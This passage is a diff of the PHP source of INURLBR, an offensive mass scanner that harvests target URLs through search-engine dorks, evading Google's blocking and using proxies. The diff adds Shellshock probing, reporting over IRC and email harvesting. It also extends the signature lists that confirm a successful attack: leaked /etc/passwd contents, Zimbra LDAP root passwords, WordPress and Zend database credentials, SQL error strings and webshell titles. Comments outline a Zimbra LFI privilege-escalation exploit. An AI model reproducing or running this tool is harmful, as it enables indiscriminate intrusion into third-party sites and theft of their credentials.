+################################################################################
 
 function __getOut($msg) {
-
+    __ircQuit($_SESSION['config']['irc']);
     print_r($msg);
-    exit();
+    exit(1);
 }
 
 ################################################################################
 #ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF ENGINE####################
+################################################################################
 
 function __process($resultadoURL) {
 
     __plus();
-    $resultadoURL_ = is_array($resultadoURL) ? array_unique(array_filter($resultadoURL)) : $resultadoURL;
-    $resultadoURL__ = ($_SESSION['config']['unique']) ? __filterDomainUnique($resultadoURL_) : $resultadoURL_;
+    $resultadoURL[0] = (is_array($resultadoURL) ? array_unique(array_filter($resultadoURL)) : $resultadoURL);
+    $resultadoURL[0] = ($_SESSION['config']['unique'] ? __filterDomainUnique($resultadoURL[0]) : $resultadoURL[0]);
 
+    $resultadoURL[0] = (not_isnull_empty($_SESSION['config']['ifurl']) ? __filterURLif($resultadoURL[0]) : $resultadoURL[0]);
+    $_SESSION['config']['total_url'] = count($resultadoURL[0]);
 
+    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c12"]}[ TOTAL FOUND VALUES ]::{$_SESSION["c1"]} [ {$_SESSION['config']['total_url']} ]{$_SESSION["c0"]}\n";
+    __debug(array('debug' => $resultadoURL[0], 'function' => '__process'), 3);
 
-    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c12"]}[ TOTAL FOUND VALUES ]::{$_SESSION["c1"]} [ " . count($resultadoURL__) . " ]{$_SESSION["c0"]}\n";
-    __debug(array('debug' => $resultadoURL__, 'function' => '__process'), 3);
+    if (count($resultadoURL[0]) > 0) {
 
-    if (count($resultadoURL__) > 0) {
-        foreach ($resultadoURL__ as $url) {
+        $_SESSION['config']['irc']['irc_connection'] = (not_isnull_empty($_SESSION['config']['irc']['conf']) ? __ircConect($_SESSION['config']['irc']) : NULL);
+        $_SESSION['config']['irc']['my_fork'] = pcntl_fork();
+
+        if ($_SESSION['config']['irc']['my_fork'] == 0) {
+
+            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ? __ircPong($_SESSION['config']['irc']) : NULL);
+            exit(0);
+        } else if ($_SESSION['config']['irc']['my_fork'] == -1) {
+
+            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}ERROR Fork failed{$_SESSION["c0"]}\n");
+        }
+
+        $_SESSION['config']['user-agent'] = ($_SESSION['config']['shellshock']) ? $_SESSION['config']['user_agent_xpl'] : $_SESSION['config']['user-agent'];
+        foreach ($resultadoURL[0] as $url) {
+
             __plus();
-            $url = not_isnull_empty($_SESSION['config']['target']) ? $_SESSION['config']['target'] . $url : $url;
+            $url = urldecode(not_isnull_empty($_SESSION['config']['target']) ?
+                            $_SESSION['config']['target'] . $url : $url);
+
             if (__validateURL($url) || not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {
-                $url = __filterURLTAG($url);
-                $_SESSION["url_dump"].="{$url}\n";
-                not_isnull_empty($_SESSION['config']['ifurl']) && strstr(urldecode($url), $_SESSION['config']['ifurl']) ? __processUrlExec(urldecode($url), $_SESSION["config"]["contUrl"] ++) : NULL;
-                !not_isnull_empty($_SESSION['config']['ifurl']) ? __processUrlExec(urldecode($url), $_SESSION["config"]["contUrl"] ++) : NULL;
+
+                __processUrlExec(__filterURLTAG($url), $_SESSION["config"]["contUrl"] ++);
                 __plus();
             }
         }
     } else {
-        __getOut(__bannerLogo() . "{$_SESSION["c1"]}0x{$_SESSION["c0"]}{$_SESSION["c2"]}Not a satisfactory result was found!{$_SESSION["c0"]}\n");
+
+        print_r("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]} Not a satisfactory result was found!{$_SESSION["c0"]}\n");
     }
 }
 
 ################################################################################
 #ERRORS STANDARDS OF SCRIPT VALIDATE WITH HTML RECEIVED#########################
+################################################################################
 
 function __checkError($html_) {
 
+
     if (__validateOptions($_SESSION['config']['tipoerro'], '2')) {
+
         $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
     }
 
     if (__validateOptions('1,3,4', $_SESSION['config']['tipoerro'])) {
 
         if (__validateOptions('3,4', $_SESSION['config']['tipoerro'])) {
+
             $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
         }
 
-        #[*]LOCAL FILE INCLUSION
+        /* [*]SHELLSHOCK
+         * (CVE-2014-6271, CVE-2014-6277,
+         * CVE-2014-6278, CVE-2014-7169, 
+         * CVE-2014-7186, CVE-2014-7187) 
+         * is a vulnerability in GNU's bash shell that gives attackers access 
+         * to run remote commands on a vulnerable system. */
+        $validation['SHELLSHOCK-01'] = '99887766555';
+
+        /* [*]LOCAL FILE INCLUSION
+         * Local File Inclusion (also known as LFI) is the process of including 
+         * files, that are already locally present on the server, through the 
+         * exploiting of vulnerable inclusion procedures implemented in the 
+         * application. 
+         * https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion */
         $validation['LOCAL-FILE-INCLUSION-01'] = '/root:/';
         $validation['LOCAL-FILE-INCLUSION-02'] = 'root:x:0:0:';
         $validation['LOCAL-FILE-INCLUSION-03'] = 'mysql:x:';
 
-        #[*]ZIMBRA MAIL
+        /* [*]ZIMBRA MAIL
+         * Zimbra 0day exploit / Privilegie escalation via LFI
+         * This script exploits a Local File Inclusion in
+         * /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
+         * which allows us to see localconfig.xml
+         * that contains LDAP root credentials wich allow us to make requests in
+         * /service/admin/soap API with the stolen LDAP credentials to create user
+         * with administration privlegies
+         * and gain acces to the Administration Console.
+         * https://www.exploit-db.com/exploits/30085/ */
         $validation['ZIMBRA-WEB-MAIL-01'] = 'zimbra_user';
         $validation['ZIMBRA-WEB-MAIL-02'] = 'zimbra_ldap_password';
         $validation['ZIMBRA-WEB-MAIL-03'] = 'ldap_replication_password';
@@ -1547,23 +2310,48 @@ function __checkError($html_) {
         $validation['ZIMBRA-WEB-MAIL-11'] = 'ldap_postfix_password';
         $validation['ZIMBRA-WEB-MAIL-12'] = 'ldap_amavis_password';
 
-        #[*]ZEND FRAMEWORK
+        /* [*]ZEND FRAMEWORK
+         * Zend-Framework Full Info Disclosure
+         * The username and password of the database may be obtained trough 
+         * the "application.ini" file
+         * https://www.exploit-db.com/exploits/29921/ */
         $validation['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
         $validation['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
         $validation['ZEND-FRAMEWORK-03'] = 'db.params.username';
         $validation['ZEND-FRAMEWORK-04'] = 'db.params.password';
         $validation['ZEND-FRAMEWORK-05'] = 'db.params.dbname';
 
-        #[*]CMS WORDPRESS
+        /* [*]CMS WORDPRESS
+         * As the name suggests, if the web application doesn’t check the file 
+         * name required by the user, any malicious user can exploit this 
+         * vulnerability to download sensitive files from the server.
+         * Arbitrary File Download vulnerability file wp-config.php
+         * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+         * http://www.acunetix.com/vulnerabilities/web/wordpress-plugin-slider-revolution-arbitrary-file-disclosure */
         $validation['CMS-WORDPRESS-01'] = "define('DB_NAME'";
         $validation['CMS-WORDPRESS-02'] = "define('DB_USER'";
         $validation['CMS-WORDPRESS-03'] = "define('DB_PASSWORD'";
         $validation['CMS-WORDPRESS-04'] = "define('DB_HOST'";
 
-        #[*]ERROR MARIADB
+        /* [*]ERROR MARIADB
+         * MariaDB is a drop-in replacement for MySQL.
+         * MariaDB strives to be the logical choice for database professionals 
+         * looking for a robust, scalable, and reliable SQL server. To accomplish 
+         * this, the MariaDB Foundation work closely and cooperatively with the 
+         * larger community of users and developers in the true spirit of Free 
+         * and open source software, and release software in a manner that 
+         * balances predictability with reliability.
+         * https://mariadb.org/en/about/ */
         $validation['MARIADB-01'] = 'MariaDB server version for the right syntax';
 
-        #[*]ERROR MYSQL
+        /* [*]ERROR MYSQL
+         * MySQL is a database management system (DBMS), which uses the SQL 
+         * (Structured Query Language, English Structured Query Language) as 
+         * interface. It is currently one of the most popular databases, with 
+         * more than 10 million installations worldwide
+         * https://www.mysql.com/ 
+         * http://php.net/manual/en/security.database.sql-injection.php
+         */
         $validation['MYSQL-AND-MARIADB'] = 'You have an error in your SQL syntax;';
         $validation['MYSQL-03'] = 'Warning: mysql_';
         $validation['MYSQL-04'] = 'function.mysql';
@@ -1579,7 +2367,11 @@ function __checkError($html_) {
         $validation['MYSQL-15'] = 'Error Executing Database Query';
         $validation['MYSQL-01'] = 'mysql_';
 
-        #[*]ERROR MICROSOFT
+        /* [*]ERROR MICROSOFT
+         * MICROSOFT TECHNOLOGY
+         * http://www.microsoft.com/pt-br/server-cloud/products/sql-server/
+         * https://products.office.com/pt-br/access 
+         * https://www.owasp.org/index.php/Testing_for_SQL_Server */
         $validation['MICROSOFT-01'] = 'Microsoft JET Database';
         $validation['MICROSOFT-02'] = 'ADODB.Recordset';
         $validation['MICROSOFT-03'] = '500 - Internal server error';
@@ -1600,7 +2392,12 @@ function __checkError($html_) {
         $validation['MICROSOFT-20'] = '[Microsoft][SQL Server Native Client 11.0][SQL Server]';
         $validation['MICROSOFT-21'] = 'Warning: odbc_';
 
-        #[*]ERROR ORACLE
+        /* #[*]ERROR ORACLE
+         * - DBMS currently marketed by Oracle, who was born in 1979 and was 
+         * the first relational BD sold worldwide;
+         * - Latest version: Oracle Database 11G;
+         * http://www.oracle.com/br/solutions/midsize/oracle-products/database/index.html
+         * https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf */
         $validation['ORACLE-01'] = 'ORA-00921: unexpected end of SQL command';
         $validation['ORACLE-02'] = 'ORA-01756';
         $validation['ORACLE-03'] = 'ORA-';
@@ -1611,12 +2408,22 @@ function __checkError($html_) {
         $validation['ORACLE-08'] = 'error ORA-';
         $validation['ORACLE-09'] = 'SQL command not properly ended';
 
-        #[*]ERROR DB2
+        /* #[*]ERROR DB2
+         * DB2 is a database system Relational Manager (SGDBR) produced by IBM. 
+         * There are different versions of DB2 running from a simple PDA | 
+         * handheld, even in powerful mainframes and run on servers based on 
+         * Unix, Windows, or Linux.
+         * http://www-01.ibm.com/software/br/db2/lowerdatabasecosts/
+         * https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#DB2_Escaping */
         $validation['DB2-01'] = 'DB2 ODBC';
         $validation['DB2-02'] = 'DB2 error';
         $validation['DB2-03'] = 'DB2 Driver';
 
-        #[*]ERROR ODBC
+        /* #[*]ERROR ODBC
+         * ODBC (acronym for Open Database Connectivity) is a standard for 
+         * access to managers of database systems (DBMS).
+         * https://support.office.com/pt-br/article/Administrar-fontes-de-dados-ODBC-b19f856b-5b9b-48c9-8b93-07484bfab5a7
+         * https://www.exploit-db.com/papers/12975/ */
         $validation['ODBC-01'] = 'ODBC SQL';
         $validation['ODBC-02'] = 'ODBC DB2';
         $validation['ODBC-03'] = 'ODBC Driver';
@@ -1625,7 +2432,11 @@ function __checkError($html_) {
         $validation['ODBC-06'] = 'ODBC Oracle';
         $validation['ODBC-07'] = 'ODBC Microsoft Access Driver';
 
-        #[*]ERROR POSTGRESQL
+        /* #[*]ERROR POSTGRESQL
+         * PostgreSQL is an object-relational database management system 
+         * (ORDBMS), developed as an open source project.
+         * http://www.postgresql.org.br/old/
+         * https://www.owasp.org/index.php/OWASP_Backend_Security_Project_Testing_PostgreSQL */
         $validation['POSTGRESQL-01'] = 'Warning: pg_';
         $validation['POSTGRESQL-02'] = 'PostgreSql Error:';
         $validation['POSTGRESQL-03'] = 'function.pg';
@@ -1633,7 +2444,12 @@ function __checkError($html_) {
         $validation['POSTGRESQL-05'] = 'PostgreSQL query failed: ERROR: parser: parse error';
         $validation['POSTGRESQL-06'] = 'pg_';
 
-        #[*]ERROR SYBASE
+        /* #[*]ERROR SYBASE
+         * Sybase (NYSE: SY), an SAP company, is a software company that 
+         * produces services and products related to information management, 
+         * mobility, messaging, development tools, and data warehousing and 
+         * OLAP data.
+         * https://www.owasp.org/index.php?search=SYBASE&title=Special%3ASearch&go=Go */
         $validation['SYBASE-01'] = 'Warning: sybase_';
         $validation['SYBASE-02'] = 'function.sybase';
         $validation['SYBASE-03'] = 'Sybase result index';
@@ -1642,13 +2458,25 @@ function __checkError($html_) {
         $validation['SYBASE-06'] = 'sybase_';
         $validation['SYBASE-07'] = '[Sybase][ODBC Driver]:';
 
-        #[*]ERROR JBOSSWEB 
+        /* #[*]ERROR JBOSSWEB 
+         * JBoss Web Server is an enterprise ready web server designed for 
+         * medium and large applications, based on Tomcat. 
+         * JBoss Web a component of the JBoss Application Server, there are 
+         * no more standalone version of JBoss Web you need the Application 
+         * Server to get the Servlet/JSP container.
+         * http://jbossweb.jboss.org/
+         * http://www.rapid7.com/db/search?utf8=%E2%9C%93&q=JBoss+&t=a */
         $validation['JBOSSWEB-01'] = 'java.sql.SQLSyntaxErrorException: ORA-';
         $validation['JBOSSWEB-02'] = 'org.springframework.jdbc.BadSqlGrammarException:';
         $validation['JBOSSWEB-03'] = 'javax.servlet.ServletException:';
         $validation['JBOSSWEB-04'] = 'java.lang.NullPointerException';
 
-        #[*]ERROR JDBC
+        /* #[*]ERROR JDBC
+         * Java Database Connectivity or JDBC is a set of classes and 
+         * interfaces (API) written in Java that make sending SQL statements 
+         * for any relational database
+         * http://www.oracle.com/technetwork/java/javase/jdbc/index.html
+         * https://www.owasp.org/index.php/Preventing_SQL_Injection_in_Java */
         $validation['JDBC_CFM-01'] = 'Error Executing Database Query';
         $validation['JDBC_CFM-02'] = 'SQLServer JDBC Driver';
         $validation['JDBC_CFM-03'] = 'JDBC SQL';
@@ -1657,10 +2485,18 @@ function __checkError($html_) {
         $validation['JDBC_CFM-06'] = 'JDBC error';
         $validation['JDBC_CFM-07'] = 'JDBC Driver';
 
-        #[*]JAVA INFINITYDB
+        /* #[*]JAVA INFINITYDB
+         * InfinityDB is an all-Java embedded database engine that is deployed 
+         * in handheld devices, on servers, on workstations, and in distributed 
+         * settings. */
         $validation['JAVA-INFINITYDB-01'] = 'java.io.IOException: InfinityDB';
 
-        #[*]ERROR PHP
+        /* #[*]ERROR PHP 
+         * The PHP development team announces the immediate availability of 
+         * PHP 5.4.40. 14 security-related bugs were fixed in this release, 
+         * including CVE-2014-9709, CVE-2015-2301, CVE-2015-2783, CVE-2015-1352. 
+         * All PHP 5.4 users are encouraged to upgrade to this version.
+         * http://php.net/ */
         $validation['ERRORPHP-01'] = 'Warning: include';
         $validation['ERRORPHP-02'] = 'Fatal error: include';
         $validation['ERRORPHP-03'] = 'Warning: require';
@@ -1683,16 +2519,24 @@ function __checkError($html_) {
         $validation['ERRORPHP-22'] = 'Warning: ocifetchstatement()';
         $validation['ERRORPHP-23'] = 'PHP Warning:';
 
-        #[*]ERROR ASP
+        /* #[*]ERROR ASP
+         * The ASP (Active Server Pages), also known as Classic ASP today, is a
+         * framework of basic libraries (and not a language) for processing of
+         * scripting languages on the server side to generate dynamic content on
+         * the Web
+         * http://www.asp.net/ */
         $validation['ERRORASP-01'] = 'Version Information: Microsoft .NET Framework';
-        $validation['ERRORASP-02'] = "Server.Execute Error";
-        $validation['ERRORASP-03'] = 'ASP.NET_SessionId';
         $validation['ERRORASP-04'] = 'ASP.NET is configured to show verbose error messages';
         $validation['ERRORASP-05'] = 'BOF or EOF';
         $validation['ERRORASP-06'] = 'Unclosed quotation mark';
         $validation['ERRORASP-06'] = 'Error converting data type varchar to numeric';
 
-        #[*]ERROR LUA
+        /* #[*]ERROR LUA 
+         * Lua is a scripting language imperative, procedural, small, reflective
+         * and light, designed to expand applications in general, to be an 
+         * extensible language (which connects parts of a program made in more 
+         * than one language)
+         * http://www.lua.org/ */
         $validation['ERRORLUA-01'] = 'LuaPlayer ERROR:';
         $validation['ERRORLUA-02'] = 'CGILua message';
         $validation['ERRORLUA-03'] = 'Lua error';
@@ -1704,7 +2548,7 @@ function __checkError($html_) {
         $validation['INDEFINITE-05'] = 'Input string was not in a correct format';
         $validation['INDEFINITE-06'] = 'An illegal character has been found in the statement';
 
-        #[*]SHELL SCRIPT
+        #[*]SHELL SCRIPT backdoored.
         $validation['SHELL-01'] = 'c99shell</title>';
         $validation['SHELL-02'] = 'C99Shell v';
         $validation['SHELL-03'] = '<form method="POST" action="cfexec.cfm">';
@@ -1744,13 +2588,17 @@ function __checkError($html_) {
     }
 
     if (!is_null($_SESSION['config']['regexp'])) {
+
         preg_match_all("#\b{$_SESSION['config']['regexp']}#i", $html_, $match);
         __plus();
         return (isset($match[0][0]) && !empty($match[0][0]) ? " regular expression->{$_SESSION['config']['regexp']} - " . $match[0][0] . " FOUD! " : NULL);
     } else {
+
         foreach ($validation as $campo => $valor) {
+
             __plus();
             if (__validateBD($html_, $validation[$campo], $campo)) {
+
                 __plus();
                 return(" {$campo}  -  VALUE: {$validation[$campo]}");
             }
@@ -1760,6 +2608,7 @@ function __checkError($html_) {
 
 ################################################################################
 #CHECK ERROR 2 HTML INSIDE######################################################
+################################################################################
 
 function __validateBD($html_, $verificar, $bd) {
 
@@ -1768,6 +2617,7 @@ function __validateBD($html_, $verificar, $bd) {
 
 ################################################################################
 #FORMAT URL#####################################################################
+################################################################################
 
 function __mountURLExploit($_url) {
 
@@ -1779,50 +2629,106 @@ function __mountURLExploit($_url) {
 
 ################################################################################
 #FILTER HTML URLs ALL THE RETURN OF seekers#####################################
+################################################################################
 
 function __filterURL($html, $op = NULL) {
 
-    $reg_href = !strstr($op, 'GOOGLE') ? 'href=\"|src=\"|value=\"' : NULL;
-    $reg = "#\b({$reg_href}http[s]?://|{$reg_href}ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
-    preg_match_all($reg, $html, $html);
-    return (array_filter(array_unique($html[0])));
+    $reg = !strstr($op, 'GOOGLE') ? "#\b(href=\"|src=\"|value=\")(.*?)(\")#si" :
+            "#\b(href=\"|src=\"|value=\"http[s]?://|href=\"|src=\"|value=\"ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
+    $html = str_replace('href="/url?q=', 'href="', $html);
+
+    if (strstr($html, '.google.com/sorry/IndexRedirect?continue=https://www.google.com.') && $_SESSION['config']['persist'] <= $_SESSION["config"]['google_attempt'][1]) {
+
+        print_r("{$_SESSION["c1"]}[ INFO ][ ERROR ]{$_SESSION["c2"]} GOOGLE LOCKED!{$_SESSION["c0"]}\n");
+        $randHost = __dominioGoogleRandom();
+        $_SESSION["config"]['google_attempt'][1] ++;
+        __pageEngine($_SESSION["config"]["conf_array_tmp"], "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $_SESSION["config"]["dork_tmp"], NULL, 0, 0, 1);
+    } else {
+        $_SESSION["config"]["google_attempt"][1] = 0;
+        preg_match_all($reg, $html, $html);
+        return (array_filter(array_unique($html[0])));
+    }
+}
+
+################################################################################
+#FILTER HTML URLs ALL THE RETURN OF GOOGLE API##################################
+################################################################################
+
+function __filterURLJson($html) {
+
+    $html = json_decode($html, true);
+    $allresponseresults = $html['responseData']['results'];
+    foreach ($allresponseresults as $value) {
+        $tmp[] = $value['url'];
+    }
+    return (array_filter(array_unique($tmp)));
+}
+
+################################################################################
+#Filtering the repeated emails #################################################
+################################################################################
+
+function __filterEmailsRepeated() {
+
+    echo "\n\n{$_SESSION["c1"]}|[ INFO ][ Filtering the repeated emails  the file {$_SESSION['config']['arquivo_output']} ]{$_SESSION["c0"]}\n";
+    $array = __openFile($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], 1);
+    if (is_array($array)) {
+
+        unlink($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output']);
+        unset($_SESSION['config']['resultado_valores']);
+        foreach ($array as $value) {
+
+            __saveValue($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], $value, 2) . __plus();
+            $_SESSION['config']['resultado_valores'] .= "{$value}\n";
+        }
+    } else {
+
+        echo "\n\n{$_SESSION["c1"]}|[ ERROR ][ ERROR EMAILS FILTERING ]{$_SESSION["c0"]}\n";
+    }
 }
 
 ################################################################################
 #COUNTING PROCESS END URLS / vuln AND SHOWING THE URLS / vuln###################
+################################################################################
 
 function __exitProcess() {
 
     $file = !is_null($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
     $file_all = !is_null($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
+    (($_SESSION['config']['extrai-email']) ? __filterEmailsRepeated() : NULL);
     $cont = count(explode("\n", $_SESSION['config']['resultado_valores'])) - 1;
-    echo "\n\n{$_SESSION["c1"]}|[ INFO ][ Shutting down ]{$_SESSION["c0"]}";
-    echo "\n{$_SESSION["c1"]}|[ INFO ][ End of process INURLBR at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c0"]}";
-    echo "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c0"]}{$_SESSION["c16"]}[ OTOTAL FILTERED VALUES ]::{$_SESSION["c1"]} [ {$cont} ]{$_SESSION["c0"]}";
-    echo!is_null($file) ? "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c16"]}[ OOUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL;
-    echo!is_null($file_all) ? "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL;
+    echo "\n\n{$_SESSION["c1"]}[ INFO ][ Shutting down ]{$_SESSION["c0"]}";
+    echo "\n{$_SESSION["c1"]}[ INFO ][ End of process INURLBR at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c0"]}";
+    echo "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]}{$_SESSION["c16"]}[ TOTAL FILTERED VALUES ]::{$_SESSION["c1"]} [ {$cont} ]{$_SESSION["c0"]}";
+    echo!is_null($file) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL;
+    echo!is_null($file_all) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL;
     echo "\n{$_SESSION["c1"]}|_________________________________________________________________________________________{$_SESSION["c0"]}\n";
+
     print_r(!$_SESSION['config']['extrai-email'] ? $_SESSION['config']['resultado_valores'] : NULL);
+
     echo "\n{$_SESSION["c1"]}\_________________________________________________________________________________________/{$_SESSION["c0"]}\n";
     __getOut("\n");
 }
 
 ################################################################################
 #CASE URLS FILTER AND VALIDATING URL VALID######################################
+################################################################################
 
 function __subProcess($resultado = NULL) {
 
     $resultado_ = is_array($resultado) ? array_unique(array_filter($resultado)) : $resultado;
     if (isset($resultado_)) {
+
         foreach ($resultado_ as $result) {
+
             $result = __filterURLTAG($result);
             $result_ = __validateURL($result) ? $result : NULL;
-            $blacklist = $_SESSION["config"]['blacklist'];
-            $blacklist_ = (!is_null($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $blacklist) : $blacklist;
+            $blacklist_ = (!is_null($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $_SESSION["config"]['blacklist']) : $_SESSION["config"]['blacklist'];
             __plus();
 
             if (not_isnull_empty($result_) && !__validateOptions($blacklist_, $result_, 1)) {
-                $_SESSION["config"]["totas_urls"].= $result_ . "\n";
+
+                $_SESSION["config"]["totas_urls"].= "{$result_}\n";
             }
         }
     }
@@ -1830,14 +2736,16 @@ function __subProcess($resultado = NULL) {
 
 ################################################################################
 #DEBUGAR VALORES E PROCESSOS####################################################
+################################################################################
 
 function __debug($valor, $op = NULL) {
 
-    return isset($_SESSION["config"]["debug"]) && __validateOptions($_SESSION["config"]["debug"], $op) ? "[ INFO ][ FUNCTION ]=>{$valor['function']}[ DEBUG ] => " . print_r($valor['debug']) . "\n" : NULL;
+    return isset($_SESSION["config"]["debug"]) && __validateOptions($_SESSION["config"]["debug"], $op) ? "\n[ INFO ][ FUNCTION ]=>{$valor['function']}[ DEBUG ] => \n" . print_r($valor['debug']) . "\n" : NULL;
 }
 
 ################################################################################
 #TIME TO PROCESS SEC############################################################
+################################################################################
 
 function __timeSec($camp, $value = NULL) {
 
@@ -1847,13 +2755,14 @@ function __timeSec($camp, $value = NULL) {
 
 ################################################################################
 #SEARCH ENGINE CONFIGURATION####################################################
+################################################################################
 
 function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pagStart, $pagLimit, $pagIncrement, $pagStart2 = NULL, $pagIncrement2 = NULL) {
 
     __plus();
 
     echo ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ ENGINE ]::{$_SESSION["c1"]}[ {$motorNome} ]{$_SESSION["c0"]}\n");
-    echo (!is_null($_SESSION['config']['max_pag']) ? ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ LIMIT PAG ]::{$_SESSION["c1"]}[ {$_SESSION["c4"]}{$_SESSION['config']['max_pag']}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n") : NULL);
+    echo (!is_null($_SESSION['config']['max_pag']) ? ("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ LIMIT PAG ]::{$_SESSION["c1"]}[ {$_SESSION['config']['max_pag']} ]{$_SESSION["c0"]}\n") : NULL);
     $http_proxy = not_isnull_empty($_SESSION['config']['proxy-http-file']) || not_isnull_empty($_SESSION['config']['proxy-http']) ? __proxyHttpRandom() : NULL;
     echo not_isnull_empty($http_proxy) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ HTTP_PROXY ]:: {$http_proxy}{$_SESSION["c0"]}\n" : NULL;
     echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c0"]}\n";
@@ -1868,21 +2777,22 @@ function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pag
         $_proxy = not_isnull_empty($confArray["list_proxy_rand"]) && !not_isnull_empty($_SESSION['config']['time-proxy']) ? $confArray["list_proxy_rand"] : $_SESSION["config"]["proxy"];
         $proxy = not_isnull_empty($_SESSION['config']['proxy-file']) && not_isnull_empty($_SESSION['config']['time-proxy']) ? __timeSecChangeProxy($confArray["list_proxy_file"]) : $_proxy;
 
-        $mountURL_ = str_replace("[DORK]", $dork, $motorURL);
-        $mountURL_ = str_replace("[PAG]", $pagStart, $mountURL_);
-        $mountURL_ = str_replace("[PAG2]", $pagStart2_, $mountURL_);
-        $mountURL_ = str_replace("[PAG3]", $pagStart3_, $mountURL_);
-        $mountURL_ = str_replace("[RANDOM]", base64_encode(intval(rand() % 255) . intval(rand() % 2553333)), $mountURL_);
-        $mountURL_ = str_replace("[IP]", intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255), $mountURL_);
+        $murl[0] = str_replace("[DORK]", $dork, $motorURL);
+        $murl[0] = str_replace("[PAG]", $pagStart, $murl[0]);
+        $murl[0] = str_replace("[PAG2]", $pagStart2_, $murl[0]);
+        $murl[0] = str_replace("[PAG3]", $pagStart3_, $murl[0]);
+        $murl[0] = str_replace("[RANDOM]", base64_encode(intval(rand() % 255) . intval(rand() % 2553333)), $murl[0]);
+        $murl[0] = str_replace("[IP]", intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255), $murl[0]);
 
 
-        $postDados = !is_null($postDados) ? __convertUrlQuery(parse_url(urldecode($mountURL_), PHP_URL_QUERY)) : NULL;
+        $postDados = !is_null($postDados) ? __convertUrlQuery(parse_url(urldecode($murl[0]), PHP_URL_QUERY)) : NULL;
 
-        __debug(array('debug' => "[ URL ENGINE ]{$http_proxy}{$mountURL_}", 'function' => '__pageEngine'), 1);
+        __debug(array('debug' => "[ URL ENGINE ]{$http_proxy}{$murl[0]}", 'function' => '__pageEngine'), 1);
 
-        $request__ = __request_info($curlObject = curl_init(), $http_proxy . $mountURL_, $proxy, $postDados);
+        $request__ = __request_info($http_proxy . $murl[0], $proxy, $postDados);
         __plus();
-        __subProcess(__filterURL($request__["corpo"], $motorNome));
+        $tmp_url = ($motorNome == 'GOOGLE API') ? __filterURLJson($request__["corpo"]) : __filterURL($request__["corpo"], $motorNome);
+        __subProcess($tmp_url);
         __plus();
 
         $pagStart = ($pagStart + $pagIncrement);
@@ -1900,23 +2810,39 @@ function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pag
 
 ################################################################################
 #SUB PROCESS INJECT VALUES######################################################
+################################################################################
 
 function __subExecExploits($target, $exploitArray = array()) {
+
     echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
